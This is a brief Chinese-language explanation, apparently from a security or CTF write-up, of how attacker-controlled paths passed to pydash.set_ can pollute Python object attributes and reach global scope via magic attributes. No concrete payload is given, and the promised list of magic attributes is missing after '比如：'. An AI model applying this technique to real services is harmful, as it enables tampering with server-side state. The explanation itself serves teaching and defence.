本质是 Python 原型链污染，也可以叫对象属性污染。攻击者通过可控的 key 和 value，让服务端执行：

pydash.set_(pollute, key, value)

从而沿着对象属性链一路写入到不该被外部用户控制的对象内部。

pydash.set_

pydash.set_(obj, path, value) 会按路径给对象设置属性。

例如：pydash.set_(pollute, “a.b.c”, 1)

等价于尝试设置：pollute.a.b.c = 1

问题在于它支持复杂路径，并且可以访问 Python 对象的魔术属性，比如：

所以可以从一个普通对象跳到全局作用域。
